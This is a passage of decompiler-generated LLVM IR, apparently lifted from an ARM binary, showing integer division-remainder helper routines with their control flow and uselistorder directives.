  %v0_133e4 = call i32 @function_132e8()
  store i32 %v9_133e0, i32* @lr, align 4
  ret i32 %v0_133e4

; uselistorder directives
  uselistorder i32 %v4_133c4, { 1, 0 }
  uselistorder i1 %v7_133bc, { 1, 0 }
  uselistorder i32 %v4_133b4, { 1, 0 }
  uselistorder i32 %v1_133b4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_133a8, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_133a8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_13398, { 1, 0 }
  uselistorder i32 %v0_13370, { 1, 0 }
  uselistorder i32 %v4_13364, { 1, 0 }
  uselistorder i32 %v1_1336c, { 1, 2, 0 }
  uselistorder i32 %v4_13358, { 1, 0 }
  uselistorder i32 %v1_13360, { 1, 2, 0 }
  uselistorder i32 %v4_1334c, { 1, 0 }
  uselistorder i32 %v1_13354, { 1, 2, 0 }
  uselistorder i32 %v1_13378, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_13348, { 1, 0 }
  uselistorder i32 %v1_13374, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_13334, { 1, 0 }
  uselistorder i32 %v3_13330, { 1, 0 }
  uselistorder i32 %v1_13330, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_13334, { 1, 2, 0, 3 }
  uselistorder i32 %v4_13320, { 1, 0 }
  uselistorder i32 %v4_1331c, { 2, 1, 0 }
  uselistorder i32 %v1_13320, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_13328.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_132f4, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_132e8, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1, 10, 12, 11 }
  uselistorder i32 65535, { 92, 47, 48, 0, 1, 11, 49, 24, 50, 23, 51, 22, 52, 12, 13, 2, 26, 53, 25, 54, 55, 14, 56, 3, 27, 57, 28, 58, 29, 59, 60, 4, 30, 61, 62, 15, 63, 5, 34, 64, 31, 65, 32, 66, 33, 67, 68, 16, 69, 6, 70, 71, 38, 72, 37, 73, 35, 74, 36, 75, 17, 18, 7, 76, 39, 77, 40, 78, 79, 80, 19, 81, 82, 8, 43, 83, 41, 84, 42, 85, 86, 20, 87, 9, 10, 46, 88, 44, 89, 45, 90, 21, 91 }
  uselistorder label %bb108, { 1, 0 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb100, { 1, 0 }
  uselistorder label %dec_label_pc_13380, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_1333c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13328thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @function_133f8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_133f8:
  store i32 %arg1, i32* @r0, align 4
  %v1_133f8 = add i32 %arg2, -1
  %v2_133f8 = icmp eq i32 %arg2, 0
  br i1 %v2_133f8, label %dec_label_pc_134b4, label %dec_label_pc_13400

dec_label_pc_13400:                               ; preds = %dec_label_pc_133f8
  %v7_133f8 = icmp eq i32 %arg2, 1
  br i1 %v7_133f8, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_13400
  %v1_13400 = load i32, i32* @r0, align 4
  %v10_13400 = icmp eq i32 %v1_13400, %arg2
  br i1 %v10_13400, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_13400, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_13400 = icmp ult i32 %v1_13400, %arg2
  br i1 %v4_13400, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_13408 = and i32 %v1_133f8, %arg2
  %v8_13408 = icmp eq i32 %v6_13408, 0
  br i1 %v8_13408, label %.thread67, label %dec_label_pc_13418.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_1340c = phi i32 [ %v1_13400, %bb75 ], [ 0, %.thread65 ]
  %v3_1340c = and i32 %v1_1340c, %v1_133f8
  br label %bb76

dec_label_pc_13418.preheader:                     ; preds = %bb75
  %v2_1341899 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_1341899, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_134a8, %bb74, %bb89, %bb84, %dec_label_pc_13478, %.thread67
  %v5_13410 = phi i32 [ %v1_13400, %bb74 ], [ %v3_1340c, %.thread67 ], [ %v1_13454.v6_13454.v6_1345c.v6_13464, %dec_label_pc_13478 ], [ 0, %bb84 ], [ %v1_134ac, %dec_label_pc_134a8 ], [ %v2_134a8, %bb89 ]
  ret i32 %v5_13410

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_13418.preheader
  %v0_1342c.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_13418.preheader ], [ %v4_13420, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_13418.preheader ], [ %v2_1342411, %.thread1.thread9 ]
  br label %dec_label_pc_1342cthread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_13418.preheader, %.thread1.thread9
  %storemerge101 = phi i32 [ %v2_1342411, %.thread1.thread9 ], [ 0, %dec_label_pc_13418.preheader ]
  %v0_1342c.pr33100 = phi i32 [ %v4_13420, %.thread1.thread9 ], [ %arg2, %dec_label_pc_13418.preheader ]
  %v4_1341c = icmp ult i32 %v0_1342c.pr33100, %v1_13400
  br i1 %v4_1341c, label %bb78, label %dec_label_pc_1342cthread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_13420 = and i32 %v0_1342c.pr33100, 268435456
  %v3_13420 = icmp eq i32 %v2_13420, 0
  %v4_13420 = mul i32 %v0_1342c.pr33100, 16
  br i1 %v3_13420, label %.thread1.thread9, label %dec_label_pc_1342c.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_1342411 = add i32 %storemerge101, 4
  %v2_13418 = icmp ugt i32 %v4_13420, 268435455
  br i1 %v2_13418, label %.thread, label %bb77

dec_label_pc_1342cthread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_1342cthread-pre-split.loopexit

dec_label_pc_1342cthread-pre-split.loopexit:      ; preds = %dec_label_pc_1342cthread-pre-split.loopexit.loopexit, %.thread
  %v0_1342c.pr3398 = phi i32 [ %v0_1342c.pr33.lcssa, %.thread ], [ %v0_1342c.pr33100, %dec_label_pc_1342cthread-pre-split.loopexit.loopexit ]
  %storemerge95 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge101, %dec_label_pc_1342cthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_1342cthread-pre-split

dec_label_pc_1342cthread-pre-split:               ; preds = %.thread4, %dec_label_pc_1342cthread-pre-split.loopexit
  %v1_1343839 = phi i32 [ %storemerge95, %dec_label_pc_1342cthread-pre-split.loopexit ], [ %v2_13438, %.thread4 ]
  %v0_1342c.pr = phi i32 [ %v0_1342c.pr3398, %dec_label_pc_1342cthread-pre-split.loopexit ], [ %v3_13434, %.thread4 ]
  br label %dec_label_pc_1342c

dec_label_pc_1342c.loopexit:                      ; preds = %bb78
  br label %dec_label_pc_1342c

dec_label_pc_1342c:                               ; preds = %dec_label_pc_1342c.loopexit, %dec_label_pc_1342cthread-pre-split
  %v0_13440.pr = phi i32 [ %v1_1343839, %dec_label_pc_1342cthread-pre-split ], [ %storemerge101, %dec_label_pc_1342c.loopexit ]
  %v1_13434 = phi i32 [ %v0_1342c.pr, %dec_label_pc_1342cthread-pre-split ], [ %v4_13420, %dec_label_pc_1342c.loopexit ]
  %v2_1342c = icmp slt i32 %v1_13434, 0
  br i1 %v2_1342c, label %dec_label_pc_13440, label %bb79

bb79:                                             ; preds = %dec_label_pc_1342c
  %v4_13430 = icmp ult i32 %v1_13434, %v1_13400
  br i1 %v4_13430, label %.thread4, label %dec_label_pc_13440

.thread4:                                         ; preds = %bb79
  %v3_13434 = mul i32 %v1_13434, 2
  %v2_13438 = add i32 %v0_13440.pr, 1
  br label %dec_label_pc_1342cthread-pre-split

dec_label_pc_13440:                               ; preds = %bb79, %dec_label_pc_1342c
  %v2_13440 = add i32 %v0_13440.pr, -3
  %v5_13444 = icmp slt i32 %v0_13440.pr, 3
  br i1 %v5_13444, label %dec_label_pc_13484, label %dec_label_pc_13448

dec_label_pc_13448:                               ; preds = %dec_label_pc_13440, %bb83
  %v6_13470 = phi i32 [ %v0_13478, %bb83 ], [ %v2_13440, %dec_label_pc_13440 ]
  %v1_1344c = phi i32 [ %v1_13454.v6_13454.v6_1345c.v6_13464, %bb83 ], [ %v1_13400, %dec_label_pc_13440 ]
  %v3_1346c12 = phi i32 [ %v3_1346c, %bb83 ], [ %v1_13434, %dec_label_pc_13440 ]
  %v3_13448 = icmp ult i32 %v1_1344c, %v3_1346c12
  %v3_1344c = select i1 %v3_13448, i32 0, i32 %v3_1346c12
  %v1_13454 = sub i32 %v1_1344c, %v3_1344c
  %v4_13450 = udiv i32 %v3_1346c12, 2
  %v6_13450 = icmp ult i32 %v1_13454, %v4_13450
  %v6_13454 = select i1 %v6_13450, i32 0, i32 %v4_13450
  %v1_13454.v6_13454 = sub i32 %v1_13454, %v6_13454
  %.demorgan = and i1 %v3_13448, %v6_13450
  %v4_13458 = udiv i32 %v3_1346c12, 4
  %v6_13458 = icmp ult i32 %v1_13454.v6_13454, %v4_13458
  %v6_1345c = select i1 %v6_13458, i32 0, i32 %v4_13458
  %v1_13454.v6_13454.v6_1345c = sub i32 %v1_13454.v6_13454, %v6_1345c
  %.demorgan71 = and i1 %.demorgan, %v6_13458
  %v4_13460 = udiv i32 %v3_1346c12, 8
  %v6_13460 = icmp ult i32 %v1_13454.v6_13454.v6_1345c, %v4_13460
  %v6_13464 = select i1 %v6_13460, i32 0, i32 %v4_13460
  %v1_13454.v6_13454.v6_1345c.v6_13464 = sub i32 %v1_13454.v6_13454.v6_1345c, %v6_13464
  %.demorgan72 = and i1 %.demorgan71, %v6_13460
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_13448
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_13448, %bb80
  %v2_13468 = add i32 %v1_13454.v6_13454.v6_1345c.v6_13464, -1
  %v4_13468 = sub i32 0, %v1_13454.v6_13454.v6_1345c.v6_13464
  %v5_13468 = and i32 %v1_13454.v6_13454.v6_1345c.v6_13464, %v4_13468
  %v3_1346c = udiv i32 %v3_1346c12, 16
  %v5_13470 = icmp slt i32 %v1_13454.v6_13454.v6_1345c.v6_13464, 1
  br i1 %v5_13470, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_13470 = add i32 %v6_13470, -4
  %v9_13470 = sub i32 3, %v6_13470
  %v10_13470 = and i32 %v9_13470, %v6_13470
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_13478 = phi i32 [ %v6_13470, %bb81 ], [ %v7_13470, %bb82 ]
  %v0_1347415.in = phi i32 [ %v2_13468, %bb81 ], [ %v7_13470, %bb82 ]
  %v1_1347414.in = phi i32 [ %v5_13468, %bb81 ], [ %v10_13470, %bb82 ]
  %v1_1347414 = icmp slt i32 %v1_1347414.in, 0
  %v0_1347415 = icmp slt i32 %v0_1347415.in, 0
  %v2_13474 = xor i1 %v0_1347415, %v1_1347414
  br i1 %v2_13474, label %dec_label_pc_13478, label %dec_label_pc_13448

dec_label_pc_13478:                               ; preds = %bb83
  %v1_13478 = urem i32 %v0_13478, 4
  %v2_13478 = icmp eq i32 %v1_13478, 0
  br i1 %v2_13478, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_13478
  %v3_1347c = icmp eq i32 %v1_13454.v6_13454.v6_1345c.v6_13464, 0
  br i1 %v3_1347c, label %bb76, label %dec_label_pc_13484

dec_label_pc_13484:                               ; preds = %bb84, %dec_label_pc_13440
  %v0_13498 = phi i32 [ %v3_1346c, %bb84 ], [ %v1_13434, %dec_label_pc_13440 ]
  %v1_13494 = phi i32 [ %v1_13454.v6_13454.v6_1345c.v6_13464, %bb84 ], [ %v1_13400, %dec_label_pc_13440 ]
  %v0_13484 = phi i32 [ %v0_13478, %bb84 ], [ %v2_13440, %dec_label_pc_13440 ]
  %v5_13488 = icmp slt i32 %v0_13484, -2
  br i1 %v5_13488, label %dec_label_pc_134a8, label %dec_label_pc_1348c

dec_label_pc_1348c:                               ; preds = %dec_label_pc_13484
  %v8_13484 = icmp eq i32 %v0_13484, -2
  br i1 %v8_13484, label %dec_label_pc_1349c, label %dec_label_pc_13490

dec_label_pc_13490:                               ; preds = %dec_label_pc_1348c
  %v3_13490 = icmp ult i32 %v1_13494, %v0_13498
  br i1 %v3_13490, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_13490
  %v2_13490 = sub i32 %v1_13494, %v0_13498
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_13490, %bb85
  %v0_1349c52 = phi i32 [ %v1_13494, %dec_label_pc_13490 ], [ %v2_13490, %bb85 ]
  %v3_13498 = udiv i32 %v0_13498, 2
  br label %dec_label_pc_1349c

dec_label_pc_1349c:                               ; preds = %dec_label_pc_1348c, %bb86
  %v0_134a4 = phi i32 [ %v0_13498, %dec_label_pc_1348c ], [ %v3_13498, %bb86 ]
  %v1_134a0 = phi i32 [ %v1_13494, %dec_label_pc_1348c ], [ %v0_1349c52, %bb86 ]
  %v3_1349c = icmp ult i32 %v1_134a0, %v0_134a4
  br i1 %v3_1349c, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_1349c
  %v2_1349c = sub i32 %v1_134a0, %v0_134a4
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_1349c, %bb87
  %v0_134a855 = phi i32 [ %v1_134a0, %dec_label_pc_1349c ], [ %v2_1349c, %bb87 ]
  %v3_134a4 = udiv i32 %v0_134a4, 2
  br label %dec_label_pc_134a8

dec_label_pc_134a8:                               ; preds = %dec_label_pc_13484, %bb88
  %v2_134ac = phi i32 [ %v0_13498, %dec_label_pc_13484 ], [ %v3_134a4, %bb88 ]
  %v1_134ac = phi i32 [ %v1_13494, %dec_label_pc_13484 ], [ %v0_134a855, %bb88 ]
  %v3_134a8 = icmp ult i32 %v1_134ac, %v2_134ac
  br i1 %v3_134a8, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_134a8
  %v2_134a8 = sub i32 %v1_134ac, %v2_134ac
  br label %bb76

dec_label_pc_134b4:                               ; preds = %dec_label_pc_133f8
  %v0_134b4 = load i32, i32* @lr, align 4
  %v0_134b8 = call i32 @function_135a8()
  call void @__pseudo_branch(i32 %v0_134b4)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_134ac, { 1, 2, 0 }
  uselistorder i32 %v0_13498, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_13478, { 1, 0, 2 }
  uselistorder i32 %v7_13470, { 1, 0 }
  uselistorder i32 %v3_1346c, { 1, 0 }
  uselistorder i32 %v1_13454.v6_13454.v6_1345c.v6_13464, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_13460, { 1, 0 }
  uselistorder i32 %v4_13458, { 1, 0 }
  uselistorder i32 %v4_13450, { 1, 0 }
  uselistorder i32 %v6_13470, { 3, 0, 2, 1 }
  uselistorder i32 %v2_13440, { 1, 0 }
  uselistorder i32 %v1_13434, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_13420, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1342c.pr33100, { 1, 0, 2, 3 }
  uselistorder i32 %v1_13400, { 4, 1, 5, 3, 0, 2, 6, 7 }
  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_134a8, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_1349c, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_13448, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @function_134c4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_134c4:
  store i32 %arg1, i32* @r0, align 4
  %v2_134c4 = icmp eq i32 %arg2, 0
  br i1 %v2_134c4, label %dec_label_pc_13598, label %dec_label_pc_134cc

dec_label_pc_134cc:                               ; preds = %dec_label_pc_134c4
  %v1_134c4 = icmp slt i32 %arg2, 0
  br i1 %v1_134c4, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_134cc
  %v2_134cc = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_134cc, %bb
  %v4_134e4 = phi i32 [ %arg2, %dec_label_pc_134cc ], [ %v2_134cc, %bb ]
  %v0_134d0 = load i32, i32* @r0, align 4
  %v1_134d0 = icmp slt i32 %v0_134d0, 0
  br i1 %v1_134d0, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_134d4 = sub i32 0, %v0_134d0
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_134dc = phi i32 [ %v0_134d0, %bb79 ], [ %v2_134d4, %bb80 ]
  %v1_134d8 = add i32 %v4_134e4, -1
  %v7_134d8 = icmp eq i32 %v4_134e4, 1
  br i1 %v7_134d8, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_134dc = icmp eq i32 %v1_134dc, %v4_134e4
  br i1 %v10_134dc, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_134dc = icmp ult i32 %v1_134dc, %v4_134e4
  br i1 %v4_134dc, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_134e4 = and i32 %v1_134d8, %v4_134e4
  %v8_134e4 = icmp eq i32 %v6_134e4, 0
  br i1 %v8_134e4, label %.thread72, label %dec_label_pc_134f4.preheader

dec_label_pc_134f4.preheader:                     ; preds = %bb84
  %v2_134f4109 = icmp ugt i32 %v4_134e4, 268435455
  br i1 %v2_134f4109, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_134e864 = phi i32 [ %v1_134dc, %bb84 ], [ 0, %.thread70 ]
  %v3_134e8 = and i32 %v1_134e864, %v1_134d8
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_134f4.preheader
  %v0_13508.pr35.lcssa = phi i32 [ %v4_134e4, %dec_label_pc_134f4.preheader ], [ %v4_134fc, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_134f4.preheader ], [ %v2_135009, %.thread2.thread7 ]
  br label %dec_label_pc_13508thread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_134f4.preheader, %.thread2.thread7
  %storemerge111 = phi i32 [ %v2_135009, %.thread2.thread7 ], [ 0, %dec_label_pc_134f4.preheader ]
  %v0_13508.pr35110 = phi i32 [ %v4_134fc, %.thread2.thread7 ], [ %v4_134e4, %dec_label_pc_134f4.preheader ]
  %v4_134f8 = icmp ult i32 %v0_13508.pr35110, %v1_134dc
  br i1 %v4_134f8, label %bb86, label %dec_label_pc_13508thread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_134fc = and i32 %v0_13508.pr35110, 268435456
  %v3_134fc = icmp eq i32 %v2_134fc, 0
  %v4_134fc = mul i32 %v0_13508.pr35110, 16
  br i1 %v3_134fc, label %.thread2.thread7, label %dec_label_pc_13508.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_135009 = add i32 %storemerge111, 4
  %v2_134f4 = icmp ugt i32 %v4_134fc, 268435455
  br i1 %v2_134f4, label %.thread1, label %bb85

dec_label_pc_13508thread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_13508thread-pre-split.loopexit

dec_label_pc_13508thread-pre-split.loopexit:      ; preds = %dec_label_pc_13508thread-pre-split.loopexit.loopexit, %.thread1
  %v0_13508.pr35108 = phi i32 [ %v0_13508.pr35.lcssa, %.thread1 ], [ %v0_13508.pr35110, %dec_label_pc_13508thread-pre-split.loopexit.loopexit ]
  %storemerge105 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge111, %dec_label_pc_13508thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_13508thread-pre-split

dec_label_pc_13508thread-pre-split:               ; preds = %.thread4, %dec_label_pc_13508thread-pre-split.loopexit
  %v1_1351441 = phi i32 [ %storemerge105, %dec_label_pc_13508thread-pre-split.loopexit ], [ %v2_13514, %.thread4 ]
  %v2_1350c36 = phi i32 [ %v1_134dc, %dec_label_pc_13508thread-pre-split.loopexit ], [ %v2_1350c, %.thread4 ]
  %v0_13508.pr = phi i32 [ %v0_13508.pr35108, %dec_label_pc_13508thread-pre-split.loopexit ], [ %v3_13510, %.thread4 ]
  br label %dec_label_pc_13508

dec_label_pc_13508.loopexit:                      ; preds = %bb86
  br label %dec_label_pc_13508

dec_label_pc_13508:                               ; preds = %dec_label_pc_13508.loopexit, %dec_label_pc_13508thread-pre-split
  %v0_1351c.pr = phi i32 [ %v1_1351441, %dec_label_pc_13508thread-pre-split ], [ %storemerge111, %dec_label_pc_13508.loopexit ]
  %v2_1350c = phi i32 [ %v2_1350c36, %dec_label_pc_13508thread-pre-split ], [ %v1_134dc, %dec_label_pc_13508.loopexit ]
  %v1_13510 = phi i32 [ %v0_13508.pr, %dec_label_pc_13508thread-pre-split ], [ %v4_134fc, %dec_label_pc_13508.loopexit ]
  %v2_13508 = icmp slt i32 %v1_13510, 0
  br i1 %v2_13508, label %dec_label_pc_1351c, label %bb87

bb87:                                             ; preds = %dec_label_pc_13508
  %v4_1350c = icmp ult i32 %v1_13510, %v2_1350c
  br i1 %v4_1350c, label %.thread4, label %dec_label_pc_1351c

.thread4:                                         ; preds = %bb87
  %v3_13510 = mul i32 %v1_13510, 2
  %v2_13514 = add i32 %v0_1351c.pr, 1
  br label %dec_label_pc_13508thread-pre-split

dec_label_pc_1351c:                               ; preds = %bb87, %dec_label_pc_13508
  %v2_1351c = add i32 %v0_1351c.pr, -3
  %v5_13520 = icmp slt i32 %v0_1351c.pr, 3
  br i1 %v5_13520, label %dec_label_pc_13560, label %dec_label_pc_13524

dec_label_pc_13524:                               ; preds = %dec_label_pc_1351c, %bb91
  %v6_1354c = phi i32 [ %v0_13554, %bb91 ], [ %v2_1351c, %dec_label_pc_1351c ]
  %v1_13528 = phi i32 [ %v1_13530.v6_13530.v6_13538.v6_13540, %bb91 ], [ %v2_1350c, %dec_label_pc_1351c ]
  %v3_1354810 = phi i32 [ %v3_13548, %bb91 ], [ %v1_13510, %dec_label_pc_1351c ]
  %v3_13524 = icmp ult i32 %v1_13528, %v3_1354810
  %v3_13528 = select i1 %v3_13524, i32 0, i32 %v3_1354810
  %v1_13530 = sub i32 %v1_13528, %v3_13528
  %v4_1352c = udiv i32 %v3_1354810, 2
  %v6_1352c = icmp ult i32 %v1_13530, %v4_1352c
  %v6_13530 = select i1 %v6_1352c, i32 0, i32 %v4_1352c
  %v1_13530.v6_13530 = sub i32 %v1_13530, %v6_13530
  %.demorgan = and i1 %v3_13524, %v6_1352c
  %v4_13534 = udiv i32 %v3_1354810, 4
  %v6_13534 = icmp ult i32 %v1_13530.v6_13530, %v4_13534
  %v6_13538 = select i1 %v6_13534, i32 0, i32 %v4_13534
  %v1_13530.v6_13530.v6_13538 = sub i32 %v1_13530.v6_13530, %v6_13538
  %.demorgan76 = and i1 %.demorgan, %v6_13534
  %v4_1353c = udiv i32 %v3_1354810, 8
  %v6_1353c = icmp ult i32 %v1_13530.v6_13530.v6_13538, %v4_1353c
  %v6_13540 = select i1 %v6_1353c, i32 0, i32 %v4_1353c
  %v1_13530.v6_13530.v6_13538.v6_13540 = sub i32 %v1_13530.v6_13530.v6_13538, %v6_13540
  %.demorgan77 = and i1 %.demorgan76, %v6_1353c
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_13524
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_13524, %bb88
  %v2_13544 = add i32 %v1_13530.v6_13530.v6_13538.v6_13540, -1
  %v4_13544 = sub i32 0, %v1_13530.v6_13530.v6_13538.v6_13540
  %v5_13544 = and i32 %v1_13530.v6_13530.v6_13538.v6_13540, %v4_13544
  %v3_13548 = udiv i32 %v3_1354810, 16
  %v5_1354c = icmp slt i32 %v1_13530.v6_13530.v6_13538.v6_13540, 1
  br i1 %v5_1354c, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_1354c = add i32 %v6_1354c, -4
  %v9_1354c = sub i32 3, %v6_1354c
  %v10_1354c = and i32 %v9_1354c, %v6_1354c
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_13554 = phi i32 [ %v6_1354c, %bb89 ], [ %v7_1354c, %bb90 ]
  %v0_1355013.in = phi i32 [ %v2_13544, %bb89 ], [ %v7_1354c, %bb90 ]
  %v1_1355012.in = phi i32 [ %v5_13544, %bb89 ], [ %v10_1354c, %bb90 ]
  %v1_1355012 = icmp slt i32 %v1_1355012.in, 0
  %v0_1355013 = icmp slt i32 %v0_1355013.in, 0
  %v2_13550 = xor i1 %v0_1355013, %v1_1355012
  br i1 %v2_13550, label %dec_label_pc_13554, label %dec_label_pc_13524

dec_label_pc_13554:                               ; preds = %bb91
  %v1_13554 = urem i32 %v0_13554, 4
  %v2_13554 = icmp eq i32 %v1_13554, 0
  br i1 %v2_13554, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_13554
  %v3_13558 = icmp eq i32 %v1_13530.v6_13530.v6_13538.v6_13540, 0
  br i1 %v3_13558, label %.thread6, label %dec_label_pc_13560

dec_label_pc_13560:                               ; preds = %bb92, %dec_label_pc_1351c
  %v0_13574 = phi i32 [ %v3_13548, %bb92 ], [ %v1_13510, %dec_label_pc_1351c ]
  %v1_13570 = phi i32 [ %v1_13530.v6_13530.v6_13538.v6_13540, %bb92 ], [ %v2_1350c, %dec_label_pc_1351c ]
  %v0_13560 = phi i32 [ %v0_13554, %bb92 ], [ %v2_1351c, %dec_label_pc_1351c ]
  %v5_13564 = icmp slt i32 %v0_13560, -2
  br i1 %v5_13564, label %dec_label_pc_13584, label %dec_label_pc_13568

dec_label_pc_13568:                               ; preds = %dec_label_pc_13560
  %v8_13560 = icmp eq i32 %v0_13560, -2
  br i1 %v8_13560, label %dec_label_pc_13578, label %dec_label_pc_1356c

dec_label_pc_1356c:                               ; preds = %dec_label_pc_13568
  %v3_1356c = icmp ult i32 %v1_13570, %v0_13574
  br i1 %v3_1356c, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_1356c
  %v2_1356c = sub i32 %v1_13570, %v0_13574
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_1356c, %bb93
  %v0_1357854 = phi i32 [ %v1_13570, %dec_label_pc_1356c ], [ %v2_1356c, %bb93 ]
  %v3_13574 = udiv i32 %v0_13574, 2
  br label %dec_label_pc_13578

dec_label_pc_13578:                               ; preds = %dec_label_pc_13568, %bb94
  %v0_13580 = phi i32 [ %v0_13574, %dec_label_pc_13568 ], [ %v3_13574, %bb94 ]
  %v1_1357c = phi i32 [ %v1_13570, %dec_label_pc_13568 ], [ %v0_1357854, %bb94 ]
  %v3_13578 = icmp ult i32 %v1_1357c, %v0_13580
  br i1 %v3_13578, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_13578
  %v2_13578 = sub i32 %v1_1357c, %v0_13580
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_13578, %bb95
  %v0_1358457 = phi i32 [ %v1_1357c, %dec_label_pc_13578 ], [ %v2_13578, %bb95 ]
  %v3_13580 = udiv i32 %v0_13580, 2
  br label %dec_label_pc_13584

dec_label_pc_13584:                               ; preds = %dec_label_pc_13560, %bb96
  %v2_13588 = phi i32 [ %v0_13574, %dec_label_pc_13560 ], [ %v3_13580, %bb96 ]
  %v1_13588 = phi i32 [ %v1_13570, %dec_label_pc_13560 ], [ %v0_1358457, %bb96 ]
  %v3_13584 = icmp ult i32 %v1_13588, %v2_13588
  br i1 %v3_13584, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_13584
  %v2_13584 = sub i32 %v1_13588, %v2_13588
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_13584, %bb83, %.thread72, %dec_label_pc_13554, %bb92, %bb97
  %v1_13590 = phi i32 [ %v1_13530.v6_13530.v6_13538.v6_13540, %dec_label_pc_13554 ], [ 0, %bb92 ], [ %v1_13588, %dec_label_pc_13584 ], [ %v2_13584, %bb97 ], [ %v3_134e8, %.thread72 ], [ %v1_134dc, %bb83 ]
  br i1 %v1_134d0, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_13590 = sub i32 0, %v1_13590
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_13594 = phi i32 [ %v1_13590, %.thread6 ], [ %v2_13590, %bb98 ]
  ret i32 %v1_13594

dec_label_pc_13598:                               ; preds = %dec_label_pc_134c4
  %v0_13598 = load i32, i32* @lr, align 4
  %v0_1359c = call i32 @function_135a8()
  call void @__pseudo_branch(i32 %v0_13598)
  ret i32 0

